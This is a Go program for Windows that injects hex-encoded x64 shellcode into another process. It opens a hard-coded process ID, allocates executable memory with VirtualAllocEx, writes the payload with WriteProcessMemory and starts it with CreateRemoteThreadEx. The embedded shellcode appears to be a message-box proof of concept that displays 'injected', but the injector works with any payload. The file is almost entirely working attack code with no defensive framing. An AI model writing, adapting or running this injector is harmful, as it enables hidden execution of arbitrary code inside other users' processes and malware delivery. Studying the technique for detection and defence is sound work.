package main

import (
	"bufio"
	"encoding/hex"
	"log"
	"os"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

// StringToCharPtr converts a Go string into pointer to a null-terminated cstring.
// This assumes the go string is already ANSI encoded.
func StringToCharPtr(str string) *uint8 {
	chars := append([]byte(str), 0) // null terminated
	return &chars[0]
}

// StringToUTF16Ptr converts a Go string into a pointer to a null-terminated UTF-16 wide string.
// This assumes str is of a UTF-8 compatible encoding so that it can be re-encoded as UTF-16.
func StringToUTF16Ptr(str string) *uint16 {
	wchars := utf16.Encode([]rune(str + "\x00"))
	return &wchars[0]
}

var (
	kernel32DLL                   = syscall.NewLazyDLL("kernel32.dll")
	psapiDLL                      = syscall.NewLazyDLL("psapi.dll")
	procOpenProcess               = kernel32DLL.NewProc("OpenProcess")
	procQueryFullProcessImageName = kernel32DLL.NewProc("QueryFullProcessImageNameW")
	procGetProcessImageFileNameW  = psapiDLL.NewProc("GetProcessImageFileNameW")
	procVirtualAllocEx            = kernel32DLL.NewProc("VirtualAllocEx")
	procWriteProcessMemory        = kernel32DLL.NewProc("WriteProcessMemory")
	procCreateRemoteThreadEx      = kernel32DLL.NewProc("CreateRemoteThreadEx")
	procCloseHandle               = kernel32DLL.NewProc("CloseHandle")
)

func main() {
	shellcode, err := hex.DecodeString("fc4881e4f0ffffffe8d0000000415141505251564831d265488b52603e488b52183e488b52203e488b72503e480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed5241513e488b52203e8b423c4801d03e8b80880000004885c0746f4801d0503e8b48183e448b40204901d0e35c48ffc93e418b34884801d64d31c94831c0ac41c1c90d4101c138e075f13e4c034c24084539d175d6583e448b40244901d0663e418b0c483e448b401c4901d03e418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a3e488b12e949ffffff5d49c7c1000000003e488d95fe0000003e4c8d85090100004831c941ba45835607ffd54831c941baf0b5a256ffd5776f776f776f776f776f00696e6a656374656400")
	if err != nil {
		log.Fatal("Problem decoding shellcode")
	}
	handle, err := OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION, 0, uint32(25860))
	log.Println(handle, err)
	// defer windows.CloseHandle(handle)
	input := bufio.NewScanner(os.Stdin)
	input.Scan()
	var buf = make([]uint16, syscall.MAX_LONG_PATH)
	var bufSize = uint32(syscall.MAX_LONG_PATH)
	size, err := QueryFullProcessImageName(handle, &buf[0], &bufSize)

	if size == 0 {
		log.Println("Problem while reading filename", err)
	}
	log.Println(windows.UTF16ToString(buf[:]))
	log.Println(size)
	input.Scan()

	var allocSize = len(shellcode)
	mem, err := VirtualAllocEx(handle, allocSize, 0x3000, 0x40)

	if mem == 0 {
		log.Fatal("Problem allocating memory to process", err)
	}
	log.Println("Address ", mem)

	input.Scan()

	var written int
	ret, err := WriteProcessMemory(handle, mem, uintptr(unsafe.Pointer(&shellcode[0])), allocSize, &written)

	if ret == 0 {
		log.Println("Error while writing to memory")
	}
	log.Println("Written to mem")
	log.Println("Written", written, "bytes")
	input.Scan()

	remoteHandle, err := CreateRemoteThreadEx(handle, mem)
	if remoteHandle == 0 {
		log.Println("Problem when creating remote thread")
	}
	log.Println("Create Remote Thread at", remoteHandle, err)
	input.Scan()

	close, _, _ := procCloseHandle.Call(handle)
	if close == 0 {
		log.Println("Problem closing handle ")
	}
	log.Println("Handle closed ")
}
func CreateRemoteThreadEx(handle uintptr, mem uintptr) (uintptr, error) {
	r1, _, err := procCreateRemoteThreadEx.Call(
		handle,
		0,
		0,
		mem,
		0,
		0,
		0,
	)
	return r1, err
}
func WriteProcessMemory(handle uintptr, lpBaseAddress uintptr, shellcode uintptr, nSize int, lpNumberOfBytesWritten *int) (int, error) {
	r1, _, err := procWriteProcessMemory.Call(
		handle,
		lpBaseAddress,
		shellcode,
		uintptr(nSize),
		uintptr(unsafe.Pointer(lpNumberOfBytesWritten)),
	)
	return int(r1), err
}

func VirtualAllocEx(handle uintptr, dwsize int, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	r1, _, err := procVirtualAllocEx.Call(
		handle,
		uintptr(0),
		uintptr(dwsize),
		uintptr(flAllocationType),
		uintptr(flProtect),
	)
	return r1, err
}
func OpenProcess(dwDesiredAccess uint32, bInheritHandle int32, dwProcessId uint32) (uintptr, error) {
	r1, _, err := procOpenProcess.Call(
		uintptr(dwDesiredAccess),
		uintptr(bInheritHandle),
		uintptr(dwProcessId),
	)
	return r1, err
}
func QueryFullProcessImageName(handle uintptr, lpExeName *uint16, pwdSize *uint32) (uintptr, error) {
	r1, _, err := procQueryFullProcessImageName.Call(
		handle,
		uintptr(0),
		uintptr(unsafe.Pointer(lpExeName)),
		uintptr(unsafe.Pointer(pwdSize)),
	)
	return r1, err
}
func GetProcessImageFileName(handle uintptr, lpImageFileName *uint16, nSize uint32) (int32, error) {
	r1, _, err := procGetProcessImageFileNameW.Call(
		handle,
		uintptr(unsafe.Pointer(lpImageFileName)),
		uintptr(nSize),
	)
	return int32(r1), err
}
